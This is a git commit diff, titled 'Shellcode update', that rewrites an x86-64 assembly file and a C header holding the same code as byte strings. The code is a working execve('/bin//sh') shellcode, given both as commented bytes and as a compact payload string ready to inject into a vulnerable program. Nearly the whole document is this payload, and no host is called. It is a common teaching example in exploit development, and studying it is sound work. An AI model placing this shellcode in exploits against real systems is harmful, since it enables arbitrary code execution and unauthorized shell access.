274bbb302c3712868a4f6d00ef7810b1506795d5
Spud <jeffrypig23@gmail.com>
2022-11-05 00:47:15 -0800

    Shellcode update

--- shell.asm
+++ shell.asm
@@ -1,30 +1,15 @@
-BITS 64
+section .text
 
-;shell db "/bin/sh",0
-;bin db "/bin" ; 2f 62 69 6e
-;sh db "/sh", 0 ; 2f 73 68
+global _start
 
-push 59
-pop rax
-
-;mov rax, 59
-;xor rdi, rdi
-;push rdi
-;mov rdi, 0x68732f6e69622f
-;push 0x68732f6e69622f
-;push 0x69622f00
-push 0x68732f6e
-;push shell
-;push sh
-;push bin
-;push rdi
-;push 0x68732f
-;push 0x6e69622f
-;push 0x0068732f
-;push 0x6e69622f
-mov rdi, [rsp]
-;mov rsi, 0
-xor rsi, rsi
-;mov rdx, 0
-xor rdx, rdx
-syscall
+_start:
+	push 59     ;sys_execve
+	pop rax
+	xor rdi, rdi
+	push rdi
+	mov rdi, 0x68732F2f6e69622F ;/bin/sh in reverse
+	push rdi
+	mov rdi, rsp ;pointer to the /bin/sh
+	xor rsi, rsi ;NULL
+	xor rdx, rdx ;NULL
+	syscall
--- shellcode.h
+++ shellcode.h
@@ -2,17 +2,17 @@
 #define HASH_SHELLCODE_H
 
 const char code[] =
-		"\x6a\x3b"                      // push 59
-		"\x58"                          // pop rax
-		"\x48\x31\xff"                  // xor rdi, rdi ; (resulting in NULL)
-		"\x57"                          // push rdi
-		"\x48\xbf\x2f\x62\x69\x6e\x2f"  // mov rdi, 0x68732f6e69622f
+		"\x6a\x3b" //push 59
+		"\x58" //pop %rax
+		"\x48\x31\xff" // xor    %rdi,%rdi
+		"\x57" //   push   %rdi
+		"\x48\xbf\x2f\x62\x69\x6e\x2f"// movabs $0x68732f2f6e69622f,%rdi
 		"\x2f\x73\x68"
-		"\x57"                          // push rdi
-		"\x48\x89\xe7"                  // mov rdi, rsp
-		"\x48\x31\xf6"                  // xor rsi, rsi ; NASM can make this esi for some reason, resulting in a crash - make sure its rsi in the objdump
-		"\x48\x31\xd2"                  // xor rdx, rdx ; NASM can make this esi for some reason, resulting in a crash - make sure its rdx in the objdump
-		"\x0f\x05"                      // syscall
+		"\x57" // push   %rdi
+		"\x48\x89\xe7"  // mov    %rsp,%rdi
+		"\x48\x31\xf6" // xor    %rsi,%rsi
+		"\x48\x31\xd2" //xor    %rdx,%rdx
+		"\x0f\x05"// syscall
 ;
 
 const char compact[] = "\x6a\x3b\x58\x48\x31\xff\x57\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05";
